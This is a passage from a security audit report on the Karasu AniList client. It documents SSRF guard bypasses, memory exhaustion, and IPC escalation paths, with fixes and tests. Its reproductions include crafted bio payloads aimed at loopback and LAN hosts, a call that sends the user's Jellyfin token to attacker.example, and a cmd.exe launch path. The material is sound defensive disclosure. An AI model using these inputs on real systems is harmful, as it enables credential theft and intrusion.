# Security Audit

> **Not the repository's security policy.** This file is the pre-release audit's
> security *findings* report. The project's own policy — what is supported,
> where the token rests per platform, how to report a vulnerability — is
> `/home/user/Karasu/SECURITY.md` at the repository root and is untouched by
> this audit.

## Scope

This report covers authentication and token storage on all three platforms, the
OAuth loopback callback, the IPC boundary and every command registered in
`generate_handler!`, SSRF in the bio-image proxy, the content security policy,
the rendering of untrusted AniList content (bios, activities, forum comments,
media descriptions), deep links, and the updater's trust chain. Audited
read-only at working-tree `3381dec`; no repository file was modified.

Source files read for this report: `src-tauri/src/commands/images.rs`,
`src-tauri/src/commands/auth.rs`, `src-tauri/src/commands/system.rs`,
`src-tauri/src/commands/playback.rs`, `src-tauri/src/commands/update.rs`,
`src-tauri/src/commands/list.rs`, `src-tauri/src/anilist/auth.rs`,
`src-tauri/src/anilist/login.rs`, `src-tauri/src/anilist/client.rs`,
`src-tauri/src/keystore.rs`, `src-tauri/src/net.rs`,
`src-tauri/src/logging.rs`, `src-tauri/src/diagnostics.rs`,
`src-tauri/src/portable.rs`, `src-tauri/src/library.rs`,
`src-tauri/src/widgets.rs`, `src-tauri/src/lib.rs`, `src-tauri/src/db.rs`,
`src-tauri/src/playback/detection/jellyfin.rs`,
`src-tauri/src/playback/scrobbler.rs`, `src-tauri/tauri.conf.json`,
`src-tauri/capabilities/default.json`, `src-tauri/gen/schemas/acl-manifests.json`,
`src-tauri/gen/android/app/src/main/java/dev/kyu/karasu/TokenCipher.kt`,
`src-tauri/gen/android/app/src/main/java/dev/kyu/karasu/MainActivity.kt`,
`src-tauri/gen/android/app/src/main/AndroidManifest.xml`,
`src/components/RichText.tsx`, `src/components/social/Markdown.tsx`,
`src/components/social/ActivityCard.tsx`, `src/lib/anilistMarkdown.ts`,
`src/lib/anilistHtml.ts`, `src/lib/anilistUrl.ts`, `src/app/App.tsx`,
`src/stores/nowPlaying.ts`, `src/pages/settings/DetectionPane.tsx`.
Two claims about the `url` crate's host parser were settled by compiling and
running the predicate against `url 2.5.8` outside the repository rather than by
reasoning; the measured output is quoted in B1-01 and B1-02.

Every severity below is the one the adversarial verification returned, not the
one originally filed. Findings marked *Source: found during adversarial
verification* were not in the first pass and are numbered from B1-10 onward.

## Trust model

Several findings only mean anything under one specific attacker. Stated plainly,
so a reader does not have to infer it:

| Attacker | What they must control | Cost to them | Findings reachable |
|---|---|---|---|
| **A malicious AniList author** | Any AniList account, whose bio / activity text / forum comment the victim views. Text only — no code runs. | Free, no privilege | B1-01, B1-02, B1-03, B1-12 |
| **A compromised WebView** | Script execution inside the Karasu page. The shipped CSP is `script-src 'self'` with no `unsafe-inline`/`unsafe-eval`, and there is no `dangerouslySetInnerHTML` anywhere in `src/`, so this presupposes a defeat of both. | High — requires an unfound renderer or parser bug | B1-10, B1-07, B1-11 |
| **A local process running as the user** | Ordinary user-level code execution on the victim's machine. | Already game over for the credential store | B1-04 (the stale `token.dat` is DPAPI-/keyring-bound, so it adds nothing this attacker did not already have) |
| **A hostile Jellyfin server on the LAN** | The server the *user* pointed Karasu at. | Requires the user to have configured it | None found. The Jellyfin response parsing is fail-closed and the token was issued by that server anyway. |
| **A network attacker** | The path to `graphql.anilist.co`, `github.com`, or a plain-HTTP Jellyfin. | Requires MITM position | None found. The updater verifies a minisign signature over the artifact before the bytes are stashed; a plain-HTTP Jellyfin is a documented deliberate decision (CLAUDE.md, `usesCleartextTraffic`). |
| **Nobody** | Documentation accuracy only. | — | B1-05, B1-06, B1-09 |

The three post-compromise findings (B1-10, B1-07, B1-11) are reported because
the brief asked for the blast radius of a WebView compromise, and because two of
them turn a renderer bug into something materially worse than "the attacker can
use the user's AniList account". They are **not** reachable by any untrusted
input the app renders today, and each says so on its own Reproduction line. They
are rated P4 for that reason, not because the primitives are weak.

## Findings at a glance

| ID | Severity | Category | File:Line | Summary |
|---|---|---|---|---|
| B1-01 | P3 | SECURITY RISK | `src-tauri/src/commands/images.rs:46` | The SSRF host guard misses IPv4-mapped IPv6 literals (`[::ffff:127.0.0.1]`) and the `100.64/10` and `198.18/15` ranges |
| B1-02 | P3 | SECURITY RISK | `src-tauri/src/commands/images.rs:47` | A trailing dot defeats the name arm of the same guard: `http://printer.local./` is fetched |
| B1-03 | P3 | SECURITY RISK | `src-tauri/src/commands/images.rs:135` | The 4 MiB image cap is enforced only after the whole body has been buffered, so a chunked response is unbounded |
| B1-10 | P4 | SECURITY RISK | `src-tauri/src/commands/playback.rs:351` | `set_jellyfin_settings` takes an unvalidated URL over IPC and the 5 s detection poll then sends the stored Jellyfin token to it |
| B1-07 | P4 | ARCHITECTURAL PROBLEM | `src-tauri/src/commands/playback.rs:211` | `set_mpv_ipc` stores an arbitrary executable path that `play_next` later spawns, escalating a WebView compromise to local code execution |
| B1-11 | P4 | SECURITY RISK | `src-tauri/src/library.rs:327` | `set_library_path` accepts an arbitrary path over IPC, unlike every other path-taking command, giving a scan-and-read-back enumeration primitive |
| B1-12 | P4 | SECURITY RISK | `src/lib/anilistMarkdown.ts:776` | The 24-image fan-out cap is per rendered document, not per screen, and `fetchBioImage` has no cache or concurrency limit |
| B1-04 | P4 | BUG | `src-tauri/src/commands/system.rs:282` | `disable_portable` has no counterpart to `migrate_to_portable_file`, so leaving portable mode silently signs the user out |
| B1-05 | P4 | SECURITY RISK | `src-tauri/src/diagnostics.rs:96` | `redact_home` returns after the first match, so a log line naming two home paths keeps the user's name in the second |
| B1-06 | P4 | DOCUMENTATION ISSUE | `src-tauri/src/commands/images.rs:86` | The proxy's "no `Referer`" claim is false on the redirect path — reqwest defaults `referer: true` |
| B1-09 | P4 | DOCUMENTATION ISSUE | `src-tauri/src/anilist/auth.rs:150` | Three places state the Android Keystore key is "hardware-backed"; the code requests no such property and never checks for it |

---

ID: B1-01

Severity: P3

Category: SECURITY RISK

File: /home/user/Karasu/src-tauri/src/commands/images.rs

Line: 46-66 (`host_is_local`), reached from 69-71 (`url_is_fetchable`), 96 and 104-112

Function: `host_is_local` / `url_is_fetchable` / `fetch_bio_image`

Problem:
`host_is_local` classifies an IP literal by pattern-matching on `IpAddr`. The
IPv6 arm tests `is_loopback()`, `is_unspecified()`, `fc00::/7` and `fe80::/10`.
None of those match an **IPv4-mapped IPv6 address**, so `::ffff:127.0.0.1`,
`::ffff:10.0.0.5` and `::ffff:169.254.169.254` are all classified as public and
fetched. The IPv4 arm relies on `Ipv4Addr::is_private()`, which is `10/8` +
`172.16/12` + `192.168/16` only, so it additionally omits the shared address
space `100.64.0.0/10` (RFC 6598 — Tailscale's range and many ISP CGNAT LANs)
and the benchmarking range `198.18.0.0/15`.

The input is an arbitrary AniList user's bio: `RichText.InlineImage`
(src/components/RichText.tsx:102-111) calls `fetchBioImage(href)` for every
image chip the markdown parser produced, and `href` is whatever the bio author
wrote as long as it is `http(s)` (`safeHref`, src/lib/anilistMarkdown.ts:168-172).
`fetch_bio_image` is registered unconditionally (lib.rs:432).

Expected Behavior:
A bio URL naming a loopback, link-local or private address in *any* spelling is
refused before a socket is opened — that is the stated purpose of the guard
("without this a crafted profile could make the app probe the machine it is
running on or the LAN behind it — the classic SSRF shape", images.rs:34-45).

Actual Behavior:
`url_is_fetchable` returns `true` for all of them. Measured twice
independently against `url 2.5.8`, with `host_is_local`/`url_is_fetchable`
pasted verbatim into a throwaway crate outside the repository:

```
http://[::ffff:127.0.0.1]/a.png     host=Some("[::ffff:7f00:1]")    fetchable=true
http://[::ffff:169.254.169.254]/a   host=Some("[::ffff:a9fe:a9fe]") fetchable=true
http://[::ffff:10.0.0.5]/a          host=Some("[::ffff:a00:5]")     fetchable=true
http://[0:0:0:0:0:ffff:7f00:1]/a    host=Some("[::ffff:7f00:1]")    fetchable=true
http://100.64.0.1/a                 host=Some("100.64.0.1")         fetchable=true
http://198.18.0.1/a                 host=Some("198.18.0.1")         fetchable=true
```

`host_is_local` strips the brackets (line 47), parses `::ffff:7f00:1` as
`IpAddr::V6`, and every one of the four V6 tests is false. reqwest then connects
to `SocketAddr::V6(::ffff:127.0.0.1, 80)`, which on Linux (and therefore
Android) reaches `127.0.0.1:80` through the kernel's IPv4-mapped handling. On
Windows the connect on a v6-only socket is expected to fail, so the IPv6 half is
a Linux/Android bypass; the `100.64/10` and `198.18/15` half needs no IPv6 at
all and works everywhere.

Reproduction:
1. Put `img(http://[::ffff:127.0.0.1:8096]/System/Info)` — or any LAN target,
   e.g. `img(http://[::ffff:192.168.1.1]/reboot)` — in an AniList bio.
   (`img(...)` is parsed at src/lib/anilistMarkdown.ts:191 and turned into a
   chip whose href goes through `safeHref`.)
2. Get any Karasu user on Linux/Android to open that profile.
3. `fetch_bio_image` issues the GET from the app process. Repeat with
   `100.64.x.x` for the plain-IPv4 gap, with no IPv6 needed at all.

Impact:
Blind SSRF from the user's machine into loopback and the LAN, driven entirely by
attacker-authored text on a third-party site. The response never reaches the
attacker (it is rendered locally, or discarded on a content-type mismatch), so
this is not a read primitive — but it is a *write* primitive against every
state-changing HTTP GET endpoint reachable from the victim's host: routers,
printers, Home Assistant, an unauthenticated Jellyfin, `http://127.0.0.1:…`
developer services. The redirect policy (images.rs:104-112) re-checks each hop
with the same broken predicate, so a public host can also 302 into the bypass.

Verification: downgraded from P2 — the module header two lines above the bug
already states the guard's own limit ("a hostname that *resolves* to a private
address still gets through … what is here stops the direct attempt",
images.rs:41-45). An attacker who wants blind SSRF into the victim's loopback
does not need `[::ffff:127.0.0.1]` at all; a DNS name they control with an A
record of `127.0.0.1` is strictly easier, works on Windows too, and is an
explicitly accepted residual. The gap adds no attacker capability — it is a
control failing open on exactly the input it was written to catch.

Root Cause:
The V6 branch enumerates address *categories* instead of normalising the address
first. `Ipv6Addr::to_ipv4_mapped()` exists precisely for this and is not used;
the V4 branch's `is_private()` predates RFC 6598.

Recommended Fix:
Normalise before classifying, and classify once:
```rust
let ip = match ip {
    IpAddr::V6(v6) => v6.to_ipv4_mapped().map(IpAddr::V4).unwrap_or(IpAddr::V6(v6)),
    v4 => v4,
};
```
then run the V4 predicate on the result, and extend the V4 predicate with
`100.64.0.0/10` and `198.18.0.0/15` (`octets[0] == 100 && (64..128).contains(&octets[1])`,
`octets[0] == 198 && (18..20).contains(&octets[1])`). Keep the V6 arm for
genuine V6 ranges only.

Regression Tests Required:
Extend `local_and_private_hosts_are_refused` (images.rs:161-180) with
`http://[::ffff:127.0.0.1]/a.png`, `http://[::ffff:10.0.0.5]/a.png`,
`http://[::ffff:169.254.169.254]/x`, `http://[0:0:0:0:0:ffff:7f00:1]/a`,
`http://100.64.0.1/a.png` and `http://198.18.0.1/a.png`. Keep
`the_hosts_bios_actually_use_are_allowed` green so the normalisation does not
over-refuse (`2606:4700::1111` must still pass).

Confidence: HIGH — reproduced independently against the same crate version.

---

ID: B1-02

Severity: P3

Category: SECURITY RISK

File: /home/user/Karasu/src-tauri/src/commands/images.rs

Line: 47-50

Function: `host_is_local`

Problem:
The three name-based tests are exact string comparisons —
`h == "localhost"`, `h.ends_with(".localhost")`, `h.ends_with(".local")` — but
the WHATWG URL parser **preserves a trailing dot** in a domain host. A fully
qualified spelling of the same name therefore fails all three tests.

Expected Behavior:
`http://localhost./a.png` and `http://printer.local./a.png` are refused, as
`http://localhost/a.png` and `http://printer.local/a.png` already are.

Actual Behavior:
Measured against `url 2.5.8`:

```
http://localhost./a.png             host=Some("localhost.")     fetchable=true
http://LOCALHOST./a                 host=Some("localhost.")     fetchable=true
http://printer.local./x             host=Some("printer.local.") fetchable=true
http://x.LOCALHOST./a               host=Some("x.localhost.")   fetchable=true
```

`"localhost."` is not `"localhost"`, does not end with `".localhost"`, and does
not end with `".local"` (it ends with `"st."`). `host_is_local` returns `false`
and the URL is fetched. The same holds for every `.local` mDNS name written as
`name.local.` and for any internal DNS name the guard would have caught by
suffix.

The numeric case is *not* affected: `http://127.0.0.1./a` normalises to
`127.0.0.1` (the crate's `ends_in_a_number` tolerates the empty root label) and
`http://192.168.1.1./a` to `192.168.1.1`, both measured `fetchable=false`. The
gap is specific to the string arm.

Reproduction:
1. Put `img(http://printer.local./cgi-bin/reset)` (or `img(http://localhost./x.png)`)
   in an AniList bio.
2. Open that profile in Karasu.
3. `url_is_fetchable` returns true and the request goes out.

Impact:
Same class as B1-01 — the LAN/loopback guard is bypassed by a one-character
change to the URL. Whether `localhost.` itself resolves to `127.0.0.1` is
resolver-dependent (glibc's hosts lookup vs. a DNS query for the root-anchored
name); the `.local` and internal-DNS cases resolve unambiguously, since every
DNS resolver treats a trailing dot as the FQDN root marker.

Verification: downgraded from P2 — same reasoning as B1-01, and it applies more
strongly here. This arm guards *names*, and a name that resolves to a private
address is exactly the case images.rs:41-45 already documents as getting
through. A real defect, but no new capability.

Root Cause:
The predicate is written against the shape a human types, not against the shape
the URL parser produces. No normalisation step exists between `Url::host_str()`
and the comparisons.

Recommended Fix:
Trim one trailing `'.'` after the bracket-stripping and lowercasing on line 47:
`let h = h.strip_suffix('.').unwrap_or(&h);` — before the three comparisons and
before the `parse::<IpAddr>()`. Consider also refusing the reserved special-use
suffixes `.internal`, `.home.arpa` and `.home` while there.

Regression Tests Required:
Add `http://localhost./a.png`, `http://LOCALHOST./a.png`,
`http://router.local./a.png` and `http://x.localhost./a.png` to
`local_and_private_hosts_are_refused`.

Confidence: HIGH — reproduced independently.

---

ID: B1-03

Severity: P3

Category: SECURITY RISK

File: /home/user/Karasu/src-tauri/src/commands/images.rs

Line: 135-143

Function: `fetch_bio_image`

Problem:
`MAX_BYTES` (4 MiB) is enforced twice — once against the declared
`Content-Length` (line 135) and once against the received buffer (line 141) —
but the second check runs **after** `resp.bytes().await` (line 138) has already
buffered the entire body in memory. A response that declares no
`Content-Length` (HTTP/1.1 chunked, or HTTP/2, which has no such requirement)
passes the first check vacuously, and nothing bounds the buffer until the
transfer ends. The comment at lines 139-140 names the chunked case explicitly
and then does the check in the one place it cannot help.

Expected Behavior:
Reading stops at the cap; a body that exceeds 4 MiB is abandoned mid-stream.

Actual Behavior:
The only ceiling is the 8-second client timeout (line 103), which reqwest
applies to the whole request including the body. reqwest imposes no
response-size limit of its own. On a fast link that is a multi-hundred-megabyte
allocation per image, and the content-type gate is satisfied by whatever the
attacker's server declares.

Reproduction:
1. Serve an endpoint that answers `Content-Type: image/png` with
   `Transfer-Encoding: chunked` and streams zeroes forever.
2. Reference it repeatedly in an AniList bio via `img(...)`.
3. Open the profile. Karasu buffers every one of those streams concurrently for
   8 seconds each.

Impact:
Memory exhaustion / OOM kill triggered by viewing a crafted profile —
particularly on Android, where the process budget is a few hundred MB and the
same code path runs. Not a confidentiality issue; a reliable remote crash is
still worth closing given the input is a stranger's text.

Correction from verification: the original report cited `MAX_INLINE_IMAGES = 24`
(src/lib/anilistMarkdown.ts:776) as the ceiling on concurrent fan-out. It is a
per-*document* cap, and a profile or feed screen renders many documents (the
bio plus each activity and each reply), so 24 is a floor on the concurrency
here, not a ceiling — see B1-12. `InlineImage` also refetches on every mount
with no cache (RichText.tsx:102-111).

Root Cause:
`Response::bytes()` is an all-or-nothing read. The declared-length pre-check was
written as the optimisation ("an oversized image costs one round trip rather
than a download") and the post-check as the correctness backstop, but a
post-check cannot bound an allocation that has already happened.

Recommended Fix:
Stream instead:
```rust
let mut buf = Vec::new();
while let Some(chunk) = resp.chunk().await.map_err(|_| "read".to_string())? {
    if (buf.len() + chunk.len()) as u64 > MAX_BYTES { return Err("too large".into()); }
    buf.extend_from_slice(&chunk);
}
```
Keep the `Content-Length` pre-check as the cheap path.

Regression Tests Required:
Extract the size accounting as a pure function and assert it aborts once the
running total passes `MAX_BYTES` given a chunk sequence (the HTTP part needs no
server then). Also assert the existing 4 MiB boundary still admits exactly
`MAX_BYTES`.

Confidence: MEDIUM — the mechanism is certain; the OOM outcome is an estimate
that depends on the device's memory budget.

---

ID: B1-10

Severity: P4

Category: SECURITY RISK

File: /home/user/Karasu/src-tauri/src/commands/playback.rs

Line: 351-361 (`set_jellyfin_settings`); with /home/user/Karasu/src-tauri/src/playback/detection/jellyfin.rs:326-328 (`normalize_base_url`) and 444-453 (`get_json`)

Function: `set_jellyfin_settings`

Problem:
`set_jellyfin_settings` writes a caller-supplied `url` straight into the kv
store. The only processing is `normalize_base_url`, which is
`raw.trim().trim_end_matches('/').to_string()` — no scheme check, no host check,
nothing. The command does **not** clear the stored Jellyfin access token when
the URL changes, and nothing else does either: `jellyfin_config`
(playback.rs:96-111) reads `jellyfin_url` and `load_token()` independently and
composes them. The scrobbler's detection loop calls `jellyfin_config` on every
tick (scrobbler.rs:1013) and the loop sleeps `POLL_INTERVAL = 5s`
(scrobbler.rs:20, 1073), so within five seconds of the write, `get_json` issues
`GET {base}/Sessions…` carrying `Authorization: MediaBrowser …, Token="<token>"`
(jellyfin.rs:450-453) to whatever host was just stored.

The only thing that stops an ordinary user doing this by accident is a frontend
`disabled` attribute: the URL `Input` in `DetectionPane.tsx:632-637` is
`disabled={settings.connected}`. That is a guard in the layer this finding
assumes compromised; the backend command enforces nothing.

Expected Behavior:
A stored credential is sent only to the host that issued it. Changing the server
address either invalidates the stored token or is refused while one is held —
and the decision is made in Rust, where the invariant "the access token stays in
the Rust backend" is supposed to live.

Actual Behavior:
```rust
pub fn set_jellyfin_settings(db: State<'_, Db>, url: String, device: String)
    -> Result<(), String> {
    db.kv_set("jellyfin_url", &crate::playback::detection::jellyfin::normalize_base_url(&url))?;
    db.kv_set("jellyfin_device", device.trim())?;
    Ok(())
}
```
One IPC call retargets the token. No user interaction, no second command, no
confirmation.

Reproduction:
Requires script execution in the WebView — which the shipped CSP
(`script-src 'self'`, no `unsafe-inline`, no `unsafe-eval`) and the
no-`dangerouslySetInnerHTML` rendering path are designed to prevent, and which
no input the app renders today can achieve. **This is a post-WebView-compromise
primitive and is rated as one.** Given that precondition:
1. `invoke("set_jellyfin_settings", { url: "https://attacker.example", device: "" })`
2. Wait up to five seconds.
3. The detection poll sends `Authorization: MediaBrowser Client="Karasu",
   Device="…", DeviceId="…", Version="…", Token="<the user's Jellyfin token>"`
   to `attacker.example`.

Impact:
Exfiltration of a stored server credential to an attacker-chosen host, with the
app doing the sending. This is the sharpest violation of the "the token stays in
Rust" constraint in the tree: the WebView still never *sees* the Jellyfin token,
and it does not need to — it only has to name the destination. The AniList
bearer is not exposed this way (`anilist_query` pins its own endpoint), but a
Jellyfin token grants read access to the user's media server and, depending on
the account, playback control.

Related and *not* a defect: a user who configures a plain-HTTP LAN Jellyfin
sends the same header in cleartext to a network attacker. That is a documented
deliberate decision (CLAUDE.md — `usesCleartextTraffic` is kept in release
because a LAN Jellyfin over plain HTTP is a supported setup), and it is the
user's own choice of server rather than an attacker's.

Root Cause:
The URL is treated as a preference like any other, written through the same
generic kv path, while the token is treated as a secret. Nothing ties the two
together, so the pairing that makes the token safe to send exists only in the
UI's `disabled` attribute.

Recommended Fix:
In `set_jellyfin_settings`, compare the normalised URL against the stored one
and, if it differs while `load_token().is_some()`, either refuse ("sign out of
the current server first") or call the same sign-out path the UI's Sign out
button uses before storing. Additionally reject a base that does not parse as an
`http`/`https` `Url` with a host, so a malformed value fails at the boundary
rather than at the next poll. The frontend's `disabled` stays as the friendly
version of the same rule.

Regression Tests Required:
A unit test on the new validator: accepts `https://jf.example`,
`http://192.168.1.10:8096` and trims a trailing slash; rejects `ftp://…`, a
scheme-less string, and a host-less URL. A `mem_db()` test asserting that
`set_jellyfin_settings` with a different URL while a token is present either
errors or leaves `load_token()` returning `None` afterwards — and that setting
the *same* URL (the Save-after-sign-in path at DetectionPane.tsx:586) is
unaffected.

Confidence: HIGH on the code path — the poll interval, the header construction
and the absence of any backend check were each read directly. The precondition
is hypothetical by design.
Source: found during adversarial verification.

---

ID: B1-07

Severity: P4

Category: ARCHITECTURAL PROBLEM

File: /home/user/Karasu/src-tauri/src/commands/playback.rs

Line: 211-220 (`set_mpv_ipc`); with /home/user/Karasu/src-tauri/src/commands/auth.rs:238-261 (`anilist_query`), /home/user/Karasu/src-tauri/src/commands/playback.rs:176-184 (`mpv_launch_config`) and /home/user/Karasu/src-tauri/src/library.rs:1318-1345 (`open_path`)

Function: `set_mpv_ipc` / `open_path` / `anilist_query`

Problem:
This is the blast-radius assessment the brief asked for. Three facts compose:

1. `anilist_query` takes `query: String` and `variables: Option<Value>` straight
   from the page and attaches the bearer in Rust. Any script running in the
   WebView has the user's full AniList authority — read private lists, post
   activities, delete entries — without ever seeing the token. The
   token-secrecy invariant holds; the *authority* does not. This part is a
   deliberate, documented design (CLAUDE.md: "the entire social surface adds no
   command at all, because `anilist_query` … is a generic authenticated
   passthrough and the token stays in Rust either way").
2. `set_mpv_ipc(launch_path)` writes `launch_path.trim()` into kv with no
   validation. Only the *pipe* path has a predicate (`is_pipe_path`,
   playback.rs:128-143) and it is not applied to the launch path.
3. `mpv_launch_config` hands that stored string to `open_path`, which does
   `std::process::Command::new(&player)…spawn()` (library.rs:1322-1329) whenever
   `play_next`/`play_episode` runs.

So a WebView compromise escalates from "AniList account takeover" to "arbitrary
local process execution as the user" in two IPC calls, with no user interaction
beyond the compromise itself — both `set_mpv_ipc` and `play_next` are ordinary
commands.

Expected Behavior:
A compromised renderer should not be able to choose which binary the backend
launches.

Actual Behavior:
It can. Note the spawn itself is correct — argv array, no shell, `--` before the
filename (library.rs:1323-1329) — so there is no *injection* bug here; the
problem is that the program name is page-controlled state.

Reproduction:
Requires script execution in the WebView (see the Trust model section — this is
a post-WebView-compromise primitive and is rated as one). Given it:
`invoke("set_mpv_ipc", { …, launchPath: "C:\\Windows\\System32\\cmd.exe" })`
then `invoke("play_next", { mediaId })`.

Impact:
Defence in depth only. It raises the value of any future XSS in the app from
"AniList account" to "code execution", which is worth knowing when weighing the
CSP and the markdown renderer.

Root Cause:
The mpv launch path is a user *setting*, and settings are written through the
IPC boundary like everything else; nothing distinguishes "a preference" from "a
program the backend will execute".

Recommended Fix:
Do not accept the launch path over IPC. Drive it from a native file-picker in
Rust the way `pick_library_folder` (library.rs:332-345) drives folder choice.
Failing that, require the basename to be `mpv`/`mpv.exe` and the file to exist
and be executable at set time.

Regression Tests Required:
A unit test on the new validator (accepts `…/mpv`, `…\mpv.exe`; rejects
`cmd.exe`, `powershell.exe`, a path with a different basename) — plus the
existing `is_pipe_path` tests unchanged.

Confidence: HIGH on the code path; the precondition is hypothetical by design.

---

ID: B1-11

Severity: P4

Category: SECURITY RISK

File: /home/user/Karasu/src-tauri/src/library.rs

Line: 327-329

Function: `set_library_path`

Problem:
`set_library_path` is `db.kv_set("library_path", path.trim())` — an arbitrary
filesystem path accepted over IPC with no validation. The native picker
(`pick_library_folder`, library.rs:332-345) exists but is not the only door: it
returns the chosen path *to the WebView*, which then calls `set_library_path`
with it. That is the opposite of the pattern the rest of the tree uses and this
audit's "Verified sound" section credits — `save_image`, `save_text`,
`open_text`, `export_diagnostics` and `open_backup_dir` never take a path from
the page at all, because the Rust side keeps the dialog's result.

The read-back is the other half. `scan_library` walks the configured folder and
`get_library_index` (library.rs:360-363) returns the whole index — "everything:
absolute paths, per-title match scores, the release names each match came from",
per its own doc comment — while `get_library_unmatched` (library.rs:921-924)
returns the files it could not place.

Expected Behavior:
The folder the backend walks is one the *user* chose in a native dialog, and the
page never gets to name it.

Actual Behavior:
Any caller of the IPC bridge names it. Setting it to `/`, `C:\Users` or
`/home/<user>` and then invoking `scan_library` produces an index the page can
read back.

Reproduction:
Requires script execution in the WebView (post-WebView-compromise primitive,
rated as one). Given it:
1. `invoke("set_library_path", { path: "C:\\Users" })`
2. `invoke("scan_library")`
3. `invoke("get_library_index")` / `invoke("get_library_unmatched")` and read the
   absolute paths back out.

Impact:
Filesystem enumeration from a compromised renderer, bounded by the walker rather
than by any access control: `MAX_DEPTH = 6`, `MAX_FILES = 20_000`
(library.rs:19-20, 1364, 1379) and an extension filter that keeps only
`parser::VIDEO_EXTENSIONS` (library.rs:1393-1395). So it discloses video
filenames and their absolute paths within six levels of an attacker-chosen root
— names that routinely carry a user's directory layout and account name — and
nothing else. Lower impact than B1-07's code execution, same precondition. It
also silently destroys the user's real library configuration, which is the
noisier half.

Root Cause:
The picker was added for convenience rather than as the boundary. Because it
hands its result through the page, the command has to accept a string, and once
it accepts a string there is nothing to validate against.

Recommended Fix:
Make the picker authoritative: have `pick_library_folder` store the chosen path
itself and return only whether a choice was made (the shape the doc comment
already describes for the mobile arm), and drop `set_library_path` from
`generate_handler!` — or, if a typed path must remain settable for the
"restore a saved configuration" case, require that the path exists, is a
directory, and is not a filesystem root or a known system directory.

Regression Tests Required:
A test that `pick_library_folder`'s success path leaves `library_path` set in a
`mem_db()` without the caller passing it back, and — if the command is kept — a
unit test on the new validator rejecting `/`, `C:\`, `C:\Windows` and a
non-existent path while accepting an ordinary directory.

Confidence: HIGH on the code path; the precondition is hypothetical by design.
Source: found during adversarial verification.

---

ID: B1-12

Severity: P4

Category: SECURITY RISK

File: /home/user/Karasu/src/lib/anilistMarkdown.ts

Line: 776 (`MAX_INLINE_IMAGES`), with /home/user/Karasu/src/components/RichText.tsx:102-111 (`InlineImage`)

Function: `capExcessImages` / `InlineImage`

Problem:
`capExcessImages` (anilistMarkdown.ts:779-803) walks one finished node tree and
marks image chips past `MAX_INLINE_IMAGES = 24` as capped. Its own doc comment
says "how many images **one document** may fetch", and that is exactly what it
enforces — the walk starts at `seen = 0` for every parse. But a screen renders
many documents: `ActivityCard` renders one `<Markdown>` per activity
(ActivityCard.tsx:335) and one per reply (ActivityCard.tsx:210), `CommentTree`
one per comment (CommentTree.tsx:115), and `ProfileHeader` one for the bio
(ProfileHeader.tsx:156). Each gets its own budget of 24.

`InlineImage` then fires `fetchBioImage(href)` from a `useEffect` on mount
(RichText.tsx:102-111) with no cache, no deduplication and no concurrency limit,
and refetches on every remount.

Expected Behavior:
The fan-out a single page view can ask for is bounded — which is what the cap
was written for: "Nothing stops a crafted profile reaching several hundred, and
that is a request fan-out a single page view should not be able to ask for"
(anilistMarkdown.ts:770-772).

Actual Behavior:
The bound is per document, so a feed of N activities each carrying replies can
ask for 24 × (N + replies) concurrent proxied requests. Nothing deduplicates the
same URL appearing in twenty comments, and scrolling a virtualized feed remounts
chips and refetches them.

Reproduction:
1. Post several activities (or comments in one thread) each containing 24
   `img(...)` nodes pointing at hosts you control.
2. Have a victim open the feed or the thread.
3. Observe the concurrent request count from the app process, well past 24.

Impact:
Two things, both modest. It compounds B1-03's memory issue by raising the
concurrency the streaming fix has to survive. And it multiplies the privacy
residual the design already documents and accepts — "the host still learns the
user's IP", images.rs:88-90 — from one profile view to a feed scroll, across an
unbounded set of attacker-chosen third-party hosts, with a repeat request each
time a row remounts.

Root Cause:
The cap is a property of a parse, and the parse is per document. The thing worth
bounding is a property of the screen and of the process making the requests,
neither of which the parser can see.

Recommended Fix:
Bound it where the requests are actually made. A module-level queue in front of
`fetchBioImage` with a small concurrency limit (4-6) and a URL-keyed result cache
gives both the fan-out bound and the deduplication, and is one place rather than
one per renderer. Keep `capExcessImages` as the per-document sanity limit.

Regression Tests Required:
A test on the queue: N simultaneous `fetchBioImage` calls issue at most the
limit concurrently and every one resolves; the same URL twice issues one
underlying call. Keep the existing per-document cap assertions in
`RichText.image.dom.test.tsx` green.

Confidence: HIGH — the per-document scope of `capExcessImages` and the absence of
any cache or queue in `InlineImage` were both read directly.
Source: found during adversarial verification.

---

ID: B1-04

Severity: P4

Category: BUG

File: /home/user/Karasu/src-tauri/src/commands/system.rs

Line: 282-285 (`disable_portable`); counterpart at /home/user/Karasu/src-tauri/src/anilist/auth.rs:121-140 (`migrate_to_portable_file`)

Function: `disable_portable`

Problem:
`enable_portable` calls `migrate_to_portable_file` (system.rs:272), which moves
the AniList token into `data/token.dat` beside the executable and **deletes the
credential-store entry** (auth.rs:128-138). `disable_portable` is a one-liner
that removes the marker file and does nothing else. There is no
`migrate_from_portable_file`; grep over the tree finds no caller that ever moves
a token back.

So after the next restart `is_portable()` is false, `load_token()`
(auth.rs:35-43) reads the credential store, and the credential store is the one
`migrate_to_portable_file` emptied. The user is signed out with nothing on
screen having said so — the pane's copy mentions only the database ("Nothing in
the portable folder is deleted", src/i18n/en.ts:1483-1484).

Expected Behavior:
Leaving portable mode carries the sign-in back to the credential store, or says
that it will not.

Actual Behavior:
```rust
pub fn disable_portable() -> Result<(), String> {
    crate::portable::remove_marker()
}
```
The session does not survive the switch, and nothing warned about it.

Reproduction:
1. Sign in to AniList. Settings → enable portable mode. Restart.
   (`token.dat` now exists beside the exe; the credential store is empty.)
2. Settings → disable portable mode. Restart.
3. The app shows the signed-out first-run screen.

Impact:
A silent sign-out on a settings toggle that advertises itself as non-destructive.
The user re-signs-in and the app works; the cost is the surprise and the lost
session, not a credential exposure.

Verification: downgraded from P3 — the security half of the original claim does
not stand. The abandoned `token.dat` is bound to the machine *and* the user
account on both platforms (DPAPI with no entropy on Windows; the Secret
Service-held key on Linux, auth.rs:7-12), so copying the folder yields nothing,
and any process that can read it is already running as that user and can equally
read the credential store. Leaving the folder alone is a stated deliberate
decision ("it is the user's data and this is a switch, not a delete",
system.rs:277-280). And `delete_token` (auth.rs:56-87) removes
`portable::token_file()` unconditionally — the path is exe-relative and not
marker-gated (portable.rs:88-93) — so the stale file *is* cleaned up the next
time the user signs out, in either mode. What remains is the undocumented silent
sign-out, which is a functional defect.

Root Cause:
The enable path is a *move* (copy + delete) and the disable path was written as
a pure toggle of the marker. The asymmetry is not noted in either doc comment;
`disable_portable`'s comment discusses only the database.

Recommended Fix:
Give `disable_portable` the counterpart: read `token_file()`, `unprotect` it,
write it to the credential store, then remove the file and drop the portable key
(the `delete_portable_key`/no-op cfg pair already exists). If the credential
store cannot be reached, refuse the switch with the same "could not read the
